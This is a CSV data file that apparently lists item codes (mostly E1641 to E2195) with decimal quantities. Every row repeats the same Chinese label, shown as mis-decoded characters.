' ½­Òõ¿â´æ,E1641,"",2.47599999999999997868
' ½­Òõ¿â´æ,E1642,"",3.71700000000000008171
' ½­Òõ¿â´æ,E1643,"",0.59799999999999997602
' ½­Òõ¿â´æ,E1644,"",1.08899999999999996803
' ½­Òõ¿â´æ,E1645,"",1.99700000000000010836
' ½­Òõ¿â´æ,E1647,"",1.04299999999999992717
' ½­Òõ¿â´æ,E1648,"",7.34700000000000041922
' ½­Òõ¿â´æ,E1649,"",4.58199999999999985079
' ½­Òõ¿â´æ,E1650,"",1.31099999999999994316
' ½­Òõ¿â´æ,E1651,"",2.31400000000000005684
' ½­Òõ¿â´æ,E1653,"",0.81100000000000005418
' ½­Òõ¿â´æ,E1654,"",1.51200000000000001066
' ½­Òõ¿â´æ,E1657,"",8.55000000000000071054
' ½­Òõ¿â´æ,E1658,"",1.85800000000000009592
' ½­Òõ¿â´æ,E1661,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1663,"",2.65600000000000013856
' ½­Òõ¿â´æ,E1664,"",1.94100000000000005862
' ½­Òõ¿â´æ,E1665,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1666,"",2.16699999999999981526
' ½­Òõ¿â´æ,E1667,"",7.16199999999999992184
' ½­Òõ¿â´æ,E1668,"",1.78400000000000003020
' ½­Òõ¿â´æ,E1669,"",1.53699999999999992184
' ½­Òõ¿â´æ,E1670,"",7.23599999999999976552
' ½­Òõ¿â´æ,E1673,"",4.73899999999999987921
' ½­Òõ¿â´æ,E1674,"",13.49099999999999965894
' ½­Òõ¿â´æ,E1675,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1676,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1677,"",2.14299999999999979394
' ½­Òõ¿â´æ,E1678,"",3.79899999999999993250
' ½­Òõ¿â´æ,E1679,"",1.16300000000000003375
' ½­Òõ¿â´æ,E1680,"",4.22400000000000019895
' ½­Òõ¿â´æ,E1682,"",1.25299999999999989164
' ½­Òõ¿â´æ,E1684,"",4.22400000000000019895
' ½­Òõ¿â´æ,E1685,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1686,"",1.28600000000000003197
' ½­Òõ¿â´æ,E1687,"",7.42100000000000026290
' ½­Òõ¿â´æ,E1688,"",1.60699999999999998401
' ½­Òõ¿â´æ,E1689,"",3.79899999999999993250
' ½­Òõ¿â´æ,E1691,"",1.09800000000000008704
' ½­Òõ¿â´æ,E1692,"",1.80099999999999993427
' ½­Òõ¿â´æ,E1693,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1694,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1695,"",2.54899999999999993250
' ½­Òõ¿â´æ,E1696,"",4.22400000000000019895
' ½­Òõ¿â´æ,E1697,"",1.74399999999999999467
' ½­Òõ¿â´æ,E1699,"",1.04699999999999993072
' ½­Òõ¿â´æ,E1700,"",0.65700000000000002842
' ½­Òõ¿â´æ,E1702,"",4.54900000000000037659
' ½­Òõ¿â´æ,E1703,"",5.24199999999999999289
' ½­Òõ¿â´æ,E1704,"",3.79899999999999993250
' ½­Òõ¿â´æ,E1705,"",3.70900000000000007461
' ½­Òõ¿â´æ,E1707,"",6.15099999999999980105
' ½­Òõ¿â´æ,E1708,"",1.25299999999999989164
' ½­Òõ¿â´æ,E1709,"",1.58299999999999996270
' ½­Òõ¿â´æ,E1710,"",1.18399999999999994138
' ½­Òõ¿â´æ,E1711,"",1.03400000000000003020
' ½­Òõ¿â´æ,E1712,"",1.16300000000000003375
' ½­Òõ¿â´æ,E1714,"",1.25299999999999989164
' ½­Òõ¿â´æ,E1715,"",5.78899999999999970157
' ½­Òõ¿â´æ,E1717,"",1.38900000000000001243
' ½­Òõ¿â´æ,E1718,"",1.74100000000000010303
' ½­Òõ¿â´æ,E1719,"",1.58899999999999996803
' ½­Òõ¿â´æ,E1720,"",12.29599999999999937472
' ½­Òõ¿â´æ,E1721,"",0.81200000000000005507
' ½­Òõ¿â´æ,E1722,"",1.15399999999999991473
' ½­Òõ¿â´æ,E1723,"",5.43299999999999982947
' ½­Òõ¿â´æ,E1724,"",1.38300000000000000711
' ½­Òõ¿â´æ,E1725,"",3.76600000000000001421
' ½­Òõ¿â´æ,E1726,"",1.67300000000000004263
' ½­Òõ¿â´æ,E1728,"",6.85799999999999965183
' ½­Òõ¿â´æ,E1729,"",1.53200000000000002842
' ½­Òõ¿â´æ,E1730,"",2.65200000000000013500
' ½­Òõ¿â´æ,E1731,"",1.28099999999999991651
' ½­Òõ¿â´æ,E1732,"",1.34299999999999997158
' ½­Òõ¿â´æ,E1733,"",0.63300000000000000711
' ½­Òõ¿â´æ,E1734,"",1.23100000000000009415
' ½­Òõ¿â´æ,E1736,"",1.56099999999999994316
' ½­Òõ¿â´æ,E1737,"",2.65399999999999991473
' ½­Òõ¿â´æ,E1738,"",3.96700000000000008171
' ½­Òõ¿â´æ,E1739,"",2.47299999999999986500
' ½­Òõ¿â´æ,E1740,"",3.75300000000000011369
' ½­Òõ¿â´æ,E1741,"",1.24399999999999999467
' ½­Òõ¿â´æ,E1744,"",2.93900000000000005684
' ½­Òõ¿â´æ,E1745,"",2.93900000000000005684
' ½­Òõ¿â´æ,E1746,"",3.60199999999999986855
' ½­Òõ¿â´æ,E1747,"",3.23099999999999987210
' ½­Òõ¿â´æ,E1748,"",1.25299999999999989164
' ½­Òõ¿â´æ,E1749,"",4.54900000000000037659
' ½­Òõ¿â´æ,E1752,"",1.25299999999999989164
' ½­Òõ¿â´æ,E1753,"",3.27800000000000002487
' ½­Òõ¿â´æ,E1755,"",2.97900000000000009237
' ½­Òõ¿â´æ,E1756,"",1.73799999999999998934
' ½­Òõ¿â´æ,E1757,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1759,"",1.61699999999999999289
' ½­Òõ¿â´æ,E1761,"",1.90599999999999991651
' ½­Òõ¿â´æ,E1762,"",4.54900000000000037659
' ½­Òõ¿â´æ,E1763,"",0.50100000000000000089
' ½­Òõ¿â´æ,E1764,"",6.01400000000000023448
' ½­Òõ¿â´æ,E1765,"",11.35599999999999987210
' ½­Òõ¿â´æ,E1766,"",2.72299999999999986500
' ½­Òõ¿â´æ,E1767,"",1.25299999999999989164
' ½­Òõ¿â´æ,E1768,"",4.00900000000000034106
' ½­Òõ¿â´æ,E1769,"",9.47899999999999920419
' ½­Òõ¿â´æ,E1770,"",1.92199999999999993072
' ½­Òõ¿â´æ,E1771,"",2.86399999999999987921
' ½­Òõ¿â´æ,E1772,"",7.90399999999999991473
' ½­Òõ¿â´æ,E1773,"",6.21699999999999963762
' ½­Òõ¿â´æ,E1774,"",5.96100000000000029843
' ½­Òõ¿â´æ,E1775,"",7.37899999999999955946
' ½­Òõ¿â´æ,E1776,"",1.23100000000000009415
' ½­Òõ¿â´æ,E1777,"",2.11299999999999998934
' ½­Òõ¿â´æ,E1778,"",1.65300000000000002487
' ½­Òõ¿â´æ,E1779,"",4.03599999999999958789
' ½­Òõ¿â´æ,E1780,"",4.54900000000000037659
' ½­Òõ¿â´æ,E1781,"",2.26600000000000001421
' ½­Òõ¿â´æ,E1782,"",0.62199999999999999734
' ½­Òõ¿â´æ,E1783,"",0.46200000000000002176
' ½­Òõ¿â´æ,E1784,"",0.52300000000000002043
' ½­Òõ¿â´æ,E1785,"",4.24899999999999966604
' ½­Òõ¿â´æ,E1786,"",1.68100000000000004974
' ½­Òõ¿â´æ,E1787,"",6.67699999999999960210
' ½­Òõ¿â´æ,E1788,"",6.67699999999999960210
' ½­Òõ¿â´æ,E1789,"",0.45700000000000001732
' ½­Òõ¿â´æ,E1791,"",3.80399999999999982592
' ½­Òõ¿â´æ,E1792,"",0.99099999999999999201
' ½­Òõ¿â´æ,E1793,"",0.83899999999999996803
' ½­Òõ¿â´æ,E1794,"",1.62299999999999999822
' ½­Òõ¿â´æ,E1795,"",1.37099999999999999645
' ½­Òõ¿â´æ,B1796,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1796,"",0.89600000000000001865
' ½­Òõ¿â´æ,E1797,"",0.87700000000000000178
' ½­Òõ¿â´æ,E1799,"",6.67699999999999960210
' ½­Òõ¿â´æ,E1800,"",6.67699999999999960210
' ½­Òõ¿â´æ,E1802,"",1.77299999999999990941
' ½­Òõ¿â´æ,E1803,"",0.86099999999999998757
' ½­Òõ¿â´æ,E1804,"",0.54600000000000004086
' ½­Òõ¿â´æ,E1805,"",1.63300000000000000711
' ½­Òõ¿â´æ,E1806,"",0.69899999999999995470
' ½­Òõ¿â´æ,E1807,"",3.34100000000000019185
' ½­Òõ¿â´æ,E1808,"",1.63300000000000000711
' ½­Òõ¿â´æ,E1809,"",1.63300000000000000711
' ½­Òõ¿â´æ,E1810,"",1.16700000000000003730
' ½­Òõ¿â´æ,E1811,"",2.33099999999999996092
' ½­Òõ¿â´æ,E1812,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1813,"",0.94199999999999994849
' ½­Òõ¿â´æ,E1814,"",2.29700000000000015277
' ½­Òõ¿â´æ,E1815,"",1.01200000000000001066
' ½­Òõ¿â´æ,E1816,"",3.67399999999999993250
' ½­Òõ¿â´æ,E1817,"",11.07300000000000039790
' ½­Òõ¿â´æ,E1818,"",1.25299999999999989164
' ½­Òõ¿â´æ,E1820,"",4.87699999999999977973
' ½­Òõ¿â´æ,E1823,"",0.56499999999999994671
' ½­Òõ¿â´æ,B1825,"",8.30000000000000071054
' ½­Òõ¿â´æ,E1825,"",1.17300000000000004263
' ½­Òõ¿â´æ,E1827,"",5.20199999999999995737
' ½­Òõ¿â´æ,E1828,"",0.66300000000000003375
' ½­Òõ¿â´æ,E1829,"",1.20399999999999995914
' ½­Òõ¿â´æ,E1832,"",1.31099999999999994316
' ½­Òõ¿â´æ,E1833,"",0.55200000000000004619
' ½­Òõ¿â´æ,E1834,"",3.16699999999999981526
' ½­Òõ¿â´æ,E1836,"",6.70099999999999962341
' ½­Òõ¿â´æ,E1838,"",2.29700000000000015277
' ½­Òõ¿â´æ,E1839,"",0.69899999999999995470
' ½­Òõ¿â´æ,E1840,"",0.88300000000000000711
' ½­Òõ¿â´æ,E1842,"",1.17199999999999993072
' ½­Òõ¿â´æ,E1843,"",0.83899999999999996803
' ½­Òõ¿â´æ,E1844,"",3.92700000000000004619
' ½­Òõ¿â´æ,E1845,"",8.37400000000000055422
' ½­Òõ¿â´æ,E1846,"",0.62800000000000000266
' ½­Òõ¿â´æ,E1847,"",2.12599999999999988987
' ½­Òõ¿â´æ,E1849,"",4.55900000000000016342
' ½­Òõ¿â´æ,E1850,"",1.63300000000000000711
' ½­Òõ¿â´æ,E1851,"",1.40799999999999991829
' ½­Òõ¿â´æ,E1852,"",1.03600000000000003197
' ½­Òõ¿â´æ,E1853,"",0.56499999999999994671
' ½­Òõ¿â´æ,E1854,"",2.52300000000000013145
' ½­Òõ¿â´æ,E1855,"",3.51100000000000012079
' ½­Òõ¿â´æ,E1856,"",1.12099999999999999645
' ½­Òõ¿â´æ,E1857,"",1.46199999999999996625
' ½­Òõ¿â´æ,E1858,"",10.87199999999999988631
' ½­Òõ¿â´æ,E1860,"",2.54300000000000014921
' ½­Òõ¿â´æ,E1862,"",1.01800000000000001599
' ½­Òõ¿â´æ,E1863,"",2.57699999999999995737
' ½­Òõ¿â´æ,E1864,"",3.24599999999999999645
' ½­Òõ¿â´æ,E1865,"",7.82300000000000039790
' ½­Òõ¿â´æ,E1866,"",0.88300000000000000711
' ½­Òõ¿â´æ,E1867,"",2.45800000000000018474
' ½­Òõ¿â´æ,E1868,"",0.65700000000000002842
' ½­Òõ¿â´æ,E1870,"",4.24899999999999966604
' ½­Òõ¿â´æ,E1871,"",1.88799999999999990052
' ½­Òõ¿â´æ,E1872,"",1.25899999999999989697
' ½­Òõ¿â´æ,E1873,"",0.87900000000000000355
' ½­Òõ¿â´æ,E1874,"",0.84099999999999996980
' ½­Òõ¿â´æ,E1876,"",3.20400000000000018119
' ½­Òõ¿â´æ,E1877,"",4.24899999999999966604
' ½­Òõ¿â´æ,E1878,"",3.77199999999999979750
' ½­Òõ¿â´æ,E1879,"",7.72100000000000008527
' ½­Òõ¿â´æ,E1880,"",4.45099999999999962341
' ½­Òõ¿â´æ,E1881,"",5.70099999999999962341
' ½­Òõ¿â´æ,E1882,"",0.76900000000000001688
' ½­Òõ¿â´æ,E1884,"",2.91400000000000014566
' ½­Òõ¿â´æ,E1885,"",3.10899999999999998579
' ½­Òõ¿â´æ,E1886,"",0.78100000000000002753
' ½­Òõ¿â´æ,E1887,"",0.70699999999999996181
' ½­Òõ¿â´æ,E1889,"",7.94399999999999995026
' ½­Òõ¿â´æ,E1890,"",1.83600000000000007638
' ½­Òõ¿â´æ,E1891,"",0.90400000000000002576
' ½­Òõ¿â´æ,E1892,"",0.63600000000000000977
' ½­Òõ¿â´æ,E1893,"",0.87099999999999999645
' ½­Òõ¿â´æ,E1894,"",0.98899999999999999023
' ½­Òõ¿â´æ,E1895,"",0.79700000000000004174
' ½­Òõ¿â´æ,E1896,"",1.91300000000000003375
' ½­Òõ¿â´æ,E1897,"",1.61899999999999999467
' ½­Òõ¿â´æ,E1898,"",0.60799999999999998490
' ½­Òõ¿â´æ,E1899,"",0.92300000000000004263
' ½­Òõ¿â´æ,E1900,"",0.58799999999999996714
' ½­Òõ¿â´æ,E1901,"",1.04600000000000004086
' ½­Òõ¿â´æ,E1902,"",0.85799999999999998490
' ½­Òõ¿â´æ,E1903,"",0.52200000000000001954
' ½­Òõ¿â´æ,E1904,"",0.52200000000000001954
' ½­Òõ¿â´æ,E1905,"",0.67800000000000004707
' ½­Òõ¿â´æ,E1906,"",1.71399999999999996803
' ½­Òõ¿â´æ,E1907,"",4.65200000000000013500
' ½­Òõ¿â´æ,E1908,"",1.10299999999999998046
' ½­Òõ¿â´æ,E1909,"",1.32699999999999995737
' ½­Òõ¿â´æ,E1910,"",1.32699999999999995737
' ½­Òõ¿â´æ,E1911,"",0.57399999999999995470
' ½­Òõ¿â´æ,E1913,"",0.62600000000000000089
' ½­Òõ¿â´æ,E1914,"",0.61599999999999999201
' ½­Òõ¿â´æ,E1915,"",2.92099999999999981881
' ½­Òõ¿â´æ,E1916,"",0.62600000000000000089
' ½­Òõ¿â´æ,E1917,"",0.41799999999999998268
' ½­Òõ¿â´æ,E1918,"",1.35800000000000009592
' ½­Òõ¿â´æ,E1919,"",0.73399999999999998579
' ½­Òõ¿â´æ,E1920,"",0.80300000000000004707
' ½­Òõ¿â´æ,E1922,"",0.85899999999999998579
' ½­Òõ¿â´æ,E1923,"",1.09899999999999997691
' ½­Òõ¿â´æ,E1924,"",1.06899999999999995026
' ½­Òõ¿â´æ,E1925,"",2.56300000000000016698
' ½­Òõ¿â´æ,E1926,"",0.82899999999999995914
' ½­Òõ¿â´æ,E1927,"",0.57699999999999995737
' ½­Òõ¿â´æ,E1928,"",0.69199999999999994849
' ½­Òõ¿â´æ,B1929,"",8.19999999999999928946
' ½­Òõ¿â´æ,E1929,"",1.85400000000000009237
' ½­Òõ¿â´æ,E1931,"",2.10599999999999987210
' ½­Òõ¿â´æ,B1932,"",8.19999999999999928946
' ½­Òõ¿â´æ,E1932,"",1.85400000000000009237
' ½­Òõ¿â´æ,B1933,"",8.19999999999999928946
' ½­Òõ¿â´æ,E1933,"",1.85400000000000009237
' ½­Òõ¿â´æ,E1934,"",7.20099999999999962341
' ½­Òõ¿â´æ,E1937,"",1.30299999999999993605
' ½­Òõ¿â´æ,E1939,"",1.31899999999999995026
' ½­Òõ¿â´æ,E1940,"",1.00499999999999989342
' ½­Òõ¿â´æ,E1941,"",0.72299999999999997602
' ½­Òõ¿â´æ,E1942,"",1.26099999999999989875
' ½­Òõ¿â´æ,E1943,"",4.88799999999999990052
' ½­Òõ¿â´æ,E1944,"",1.39599999999999990763
' ½­Òõ¿â´æ,B1945,"",8.19999999999999928946
' ½­Òõ¿â´æ,E1945,"",1.85400000000000009237
' ½­Òõ¿â´æ,E1946,"",0.65900000000000003020
' ½­Òõ¿â´æ,E1947,"",0.98899999999999999023
' ½­Òõ¿â´æ,E1948,"",0.68899999999999994582
' ½­Òõ¿â´æ,E1949,"",2.50700000000000011724
' ½­Òõ¿â´æ,E1950,"",1.08899999999999996803
' ½­Òõ¿â´æ,E1951,"",1.42900000000000004796
' ½­Òõ¿â´æ,E1954,"",1.17799999999999993605
' ½­Òõ¿â´æ,E1955,"",0.94199999999999994849
' ½­Òõ¿â´æ,E1956,"",8.13700000000000045475
' ½­Òõ¿â´æ,E1957,"",4.38199999999999967315
' ½­Òõ¿â´æ,E1958,"",1.10400000000000009237
' ½­Òõ¿â´æ,E1959,"",0.43699999999999999956
' ½­Òõ¿â´æ,E1960,"",4.48099999999999987210
' ½­Òõ¿â´æ,E1961,"",2.30799999999999982947
' ½­Òõ¿â´æ,E1962,"",0.56000000000000005329
' ½­Òõ¿â´æ,E1963,"",0.56499999999999994671
' ½­Òõ¿â´æ,E1964,"",0.46600000000000002531
' ½­Òõ¿â´æ,E1965,"",10.61299999999999954525
' ½­Òõ¿â´æ,E1967,"",7.82300000000000039790
' ½­Òõ¿â´æ,E1968,"",13.18800000000000061107
' ½­Òõ¿â´æ,E1970,"",0.49599999999999999645
' ½­Òõ¿â´æ,E1972,"",1.70700000000000007283
' ½­Òõ¿â´æ,E1973,"",0.63600000000000000977
' ½­Òõ¿â´æ,E1974,"",0.88300000000000000711
' ½­Òõ¿â´æ,E1975,"",0.64300000000000001599
' ½­Òõ¿â´æ,E1976,"",0.73399999999999998579
' ½­Òõ¿â´æ,E1977,"",6.67699999999999960210
' ½­Òõ¿â´æ,E1978,"",2.00999999999999978684
' ½­Òõ¿â´æ,E1979,"",0.82699999999999995737
' ½­Òõ¿â´æ,E1981,"",1.06099999999999994316
' ½­Òõ¿â´æ,E1982,"",1.16300000000000003375
' ½­Òõ¿â´æ,E1983,"",2.26100000000000012079
' ½­Òõ¿â´æ,E1985,"",4.91699999999999981526
' ½­Òõ¿â´æ,E1986,"",3.46200000000000018829
' ½­Òõ¿â´æ,E1987,"",3.46200000000000018829
' ½­Òõ¿â´æ,E1988,"",4.54900000000000037659
' ½­Òõ¿â´æ,E1989,"",0.69199999999999994849
' ½­Òõ¿â´æ,E1990,"",3.76799999999999979394
' ½­Òõ¿â´æ,E1991,"",1.07200000000000006395
' ½­Òõ¿â´æ,E1992,"",2.91400000000000014566
' ½­Òõ¿â´æ,E1993,"",1.20599999999999996092
' ½­Òõ¿â´æ,E1994,"",1.28600000000000003197
' ½­Òõ¿â´æ,E1995,"",3.46099999999999985434
' ½­Òõ¿â´æ,E1996,"",1.82400000000000006573
' ½­Òõ¿â´æ,E1997,"",1.03600000000000003197
' ½­Òõ¿â´æ,E1998,"",0.80400000000000004796
' ½­Òõ¿â´æ,E1999,"",2.65399999999999991473
' ½­Òõ¿â´æ,E2000,"",2.26900000000000012790
' ½­Òõ¿â´æ,E2001,"",0.98899999999999999023
' ½­Òõ¿â´æ,E2002,"",1.13799999999999990052
' ½­Òõ¿â´æ,E2003,"",0.84599999999999997424
' ½­Òõ¿â´æ,E2004,"",1.28099999999999991651
' ½­Òõ¿â´æ,E2005,"",0.60299999999999998046
' ½­Òõ¿â´æ,E2006,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2007,"",1.18599999999999994316
' ½­Òõ¿â´æ,E2008,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2010,"",1.06899999999999995026
' ½­Òõ¿â´æ,E2012,"",1.18599999999999994316
' ½­Òõ¿â´æ,E2013,"",1.82600000000000006750
' ½­Òõ¿â´æ,E2014,"",2.41699999999999981526
' ½­Òõ¿â´æ,E2015,"",4.01700000000000034817
' ½­Òõ¿â´æ,E2016,"",1.30299999999999993605
' ½­Òõ¿â´æ,E2017,"",1.18599999999999994316
' ½­Òõ¿â´æ,E2018,"",5.37300000000000022027
' ½­Òõ¿â´æ,E2019,"",1.66799999999999992717
' ½­Òõ¿â´æ,E2020,"",0.73099999999999998312
' ½­Òõ¿â´æ,E2021,"",6.67300000000000004263
' ½­Òõ¿â´æ,E2023,"",2.83800000000000007816
' ½­Òõ¿â´æ,E2025,"",4.47200000000000041922
' ½­Òõ¿â´æ,E2026,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2027,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2028,"",1.13799999999999990052
' ½­Òõ¿â´æ,E2029,"",1.90900000000000003020
' ½­Òõ¿â´æ,E2030,"",1.84899999999999997691
' ½­Òõ¿â´æ,E2032,"",11.04400000000000048317
' ½­Òõ¿â´æ,E2033,"",1.85299999999999998046
' ½­Òõ¿â´æ,E2034,"",0.75100000000000000089
' ½­Òõ¿â´æ,E2035,"",4.51900000000000012790
' ½­Òõ¿â´æ,E2036,"",0.72099999999999997424
' ½­Òõ¿â´æ,E2037,"",0.77700000000000002398
' ½­Òõ¿â´æ,E2038,"",1.76400000000000001243
' ½­Òõ¿â´æ,E2039,"",0.79100000000000003642
' ½­Òõ¿â´æ,E2040,"",7.70800000000000018474
' ½­Òõ¿â´æ,E2041,"",9.23199999999999931788
' ½­Òõ¿â´æ,E2042,"",20.19399999999999906208
' ½­Òõ¿â´æ,E2043,"",1.16300000000000003375
' ½­Òõ¿â´æ,E2044,"",3.10899999999999998579
' ½­Òõ¿â´æ,E2046,"",1.37200000000000010836
' ½­Òõ¿â´æ,E2047,"",0.54600000000000004086
' ½­Òõ¿â´æ,E2048,"",0.60199999999999997957
' ½­Òõ¿â´æ,E2049,"",4.98299999999999965183
' ½­Òõ¿â´æ,E2051,"",2.49699999999999988631
' ½­Òõ¿â´æ,E2052,"",1.14300000000000001599
' ½­Òõ¿â´æ,E2053,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2054,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2055,"",0.78800000000000003375
' ½­Òõ¿â´æ,E2056,"",1.26099999999999989875
' ½­Òõ¿â´æ,E2057,"",3.58099999999999996092
' ½­Òõ¿â´æ,E2058,"",3.58099999999999996092
' ½­Òõ¿â´æ,E2060,"",1.18599999999999994316
' ½­Òõ¿â´æ,E2061,"",2.12300000000000022027
' ½­Òõ¿â´æ,E2062,"",6.42199999999999970868
' ½­Òõ¿â´æ,E2064,"",1.64900000000000002132
' ½­Òõ¿â´æ,E2065,"",3.61600000000000010303
' ½­Òõ¿â´æ,E2066,"",1.10299999999999998046
' ½­Òõ¿â´æ,E2067,"",2.29099999999999992539
' ½­Òõ¿â´æ,E2068,"",1.64300000000000001599
' ½­Òõ¿â´æ,E2071,"",0.64700000000000001954
' ½­Òõ¿â´æ,E2072,"",0.78300000000000002931
' ½­Òõ¿â´æ,E2073,"",2.50700000000000011724
' ½­Òõ¿â´æ,E2074,"",1.69799999999999995381
' ½­Òõ¿â´æ,E2075,"",0.64300000000000001599
' ½­Òõ¿â´æ,E2076,"",0.60799999999999998490
' ½­Òõ¿â´æ,E2077,"",0.73099999999999998312
' ½­Òõ¿â´æ,E2078,"",1.18700000000000005507
' ½­Òõ¿â´æ,E2079,"",2.02400000000000002132
' ½­Òõ¿â´æ,E2080,"",1.18599999999999994316
' ½­Òõ¿â´æ,E2081,"",1.08600000000000007638
' ½­Òõ¿â´æ,E2082,"",3.29700000000000015277
' ½­Òõ¿â´æ,E2083,"",2.57699999999999995737
' ½­Òõ¿â´æ,E2084,"",5.69899999999999984368
' ½­Òõ¿â´æ,E2085,"",1.16300000000000003375
' ½­Òõ¿â´æ,E2086,"",0.73399999999999998579
' ½­Òõ¿â´æ,E2087,"",6.87300000000000022027
' ½­Òõ¿â´æ,E2088,"",0.75400000000000000355
' ½­Òõ¿â´æ,E2089,"",1.30099999999999993427
' ½­Òõ¿â´æ,E2090,"",1.18799999999999994493
' ½­Òõ¿â´æ,E2091,"",0.79200000000000003730
' ½­Òõ¿â´æ,E2092,"",1.16900000000000003908
' ½­Òõ¿â´æ,E2094,"",3.45900000000000007461
' ½­Òõ¿â´æ,E2095,"",8.16399999999999970157
' ½­Òõ¿â´æ,E2096,"",0.91800000000000003819
' ½­Òõ¿â´æ,E2097,"",1.36600000000000010303
' ½­Òõ¿â´æ,E2099,"",0.70699999999999996181
' ½­Òõ¿â´æ,E2100,"",0.70699999999999996181
' ½­Òõ¿â´æ,E2101,"",1.51699999999999990408
' ½­Òõ¿â´æ,E2102,"",2.06899999999999995026
' ½­Òõ¿â´æ,E2103,"",1.28600000000000003197
' ½­Òõ¿â´æ,E2104,"",2.27099999999999990763
' ½­Òõ¿â´æ,E2105,"",2.78299999999999991829
' ½­Òõ¿â´æ,E2107,"",1.11699999999999999289
' ½­Òõ¿â´æ,E2108,"",1.15799999999999991829
' ½­Òõ¿â´æ,E2109,"",6.07399999999999984368
' ½­Òõ¿â´æ,E2110,"",3.04400000000000003908
' ½­Òõ¿â´æ,E2112,"",0.62900000000000000355
' ½­Òõ¿â´æ,E2113,"",0.94199999999999994849
' ½­Òõ¿â´æ,B2115,"",8.30000000000000071054
' ½­Òõ¿â´æ,E2116,"",5.97299999999999986500
' ½­Òõ¿â´æ,E2117,"",1.22500000000000008882
' ½­Òõ¿â´æ,E2118,"",0.60199999999999997957
' ½­Òõ¿â´æ,E2119,"",0.70699999999999996181
' ½­Òõ¿â´æ,E2120,"",0.78800000000000003375
' ½­Òõ¿â´æ,E2121,"",0.52200000000000001954
' ½­Òõ¿â´æ,E2122,"",3.29700000000000015277
' ½­Òõ¿â´æ,E2123,"",3.56199999999999983302
' ½­Òõ¿â´æ,E2124,"",5.39100000000000001421
' ½­Òõ¿â´æ,E2125,"",1.06200000000000005507
' ½­Òõ¿â´æ,E2126,"",2.13899999999999979039
' ½­Òõ¿â´æ,E2128,"",1.08600000000000007638
' ½­Òõ¿â´æ,E2130,"",5.51299999999999990052
' ½­Òõ¿â´æ,E2131,"",5.80900000000000016342
' ½­Òõ¿â´æ,E2132,"",1.27299999999999990941
' ½­Òõ¿â´æ,E2133,"",2.36299999999999998934
' ½­Òõ¿â´æ,E2134,"",3.22299999999999986500
' ½­Òõ¿â´æ,B2136,"",16.39999999999999857891
' ½­Òõ¿â´æ,E2136,"",4.74899999999999966604
' ½­Òõ¿â´æ,E2137,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2138,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2139,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2140,"",1.74399999999999999467
' ½­Òõ¿â´æ,B2141,"",16.39999999999999857891
' ½­Òõ¿â´æ,E2141,"",4.74899999999999966604
' ½­Òõ¿â´æ,E2142,"",0.62900000000000000355
' ½­Òõ¿â´æ,E2144,"",2.08599999999999985434
' ½­Òõ¿â´æ,E2145,"",1.06899999999999995026
' ½­Òõ¿â´æ,E2146,"",3.14299999999999979394
' ½­Òõ¿â´æ,B2147,"",8.30000000000000071054
' ½­Òõ¿â´æ,E2147,"",1.17300000000000004263
' ½­Òõ¿â´æ,E2148,"",0.94199999999999994849
' ½­Òõ¿â´æ,E2149,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2150,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2151,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2152,"",3.87300000000000022027
' ½­Òõ¿â´æ,E2153,"",2.33599999999999985434
' ½­Òõ¿â´æ,E2154,"",2.17799999999999993605
' ½­Òõ¿â´æ,E2155,"",1.56400000000000005684
' ½­Òõ¿â´æ,E2156,"",1.02099999999999990763
' ½­Òõ¿â´æ,E2157,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2158,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2159,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2160,"",1.57600000000000006750
' ½­Òõ¿â´æ,E2161,"",3.40099999999999980105
' ½­Òõ¿â´æ,E2162,"",4.00600000000000022737
' ½­Òõ¿â´æ,E2163,"",6.54100000000000036948
' ½­Òõ¿â´æ,E2164,"",0.79300000000000003819
' ½­Òõ¿â´æ,E2165,"",2.67600000000000015632
' ½­Òõ¿â´æ,E2167,"",0.87399999999999999911
' ½­Òõ¿â´æ,E2168,"",1.41300000000000003375
' ½­Òõ¿â´æ,E2169,"",1.69300000000000006040
' ½­Òõ¿â´æ,E2170,"",0.95799999999999996270
' ½­Òõ¿â´æ,E2171,"",6.02299999999999968736
' ½­Òõ¿â´æ,E2172,"",3.45900000000000007461
' ½­Òõ¿â´æ,E2173,"",1.04400000000000003908
' ½­Òõ¿â´æ,E2174,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2175,"",1.70900000000000007461
' ½­Òõ¿â´æ,E2176,"",1.87799999999999989164
' ½­Òõ¿â´æ,E2177,"",1.73900000000000010125
' ½­Òõ¿â´æ,E2178,"",1.74399999999999999467
' ½­Òõ¿â´æ,B2179,"",8.19999999999999928946
' ½­Òõ¿â´æ,E2179,"",1.85400000000000009237
' ½­Òõ¿â´æ,B2181,"",18.39999999999999857891
' ½­Òõ¿â´æ,E2181,"",5.28699999999999992184
' ½­Òõ¿â´æ,E2183,"",1.63300000000000000711
' ½­Òõ¿â´æ,E2184,"",1.67799999999999993605
' ½­Òõ¿â´æ,E2185,"",1.52899999999999991473
' ½­Òõ¿â´æ,E2186,"",1.74399999999999999467
' ½­Òõ¿â´æ,E2187,"",1.73900000000000010125
' ½­Òõ¿â´æ,E2189,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2190,"",1.20900000000000007461
' ½­Òõ¿â´æ,E2191,"",0.98199999999999998401
' ½­Òõ¿â´æ,E2192,"",1.21799999999999997158
' ½­Òõ¿â´æ,E2193,"",1.42799999999999993605
' ½­Òõ¿â´æ,E2194,"",3.86299999999999998934
' ½­Òõ¿â´æ,E2195,"",4.36699999999999999289
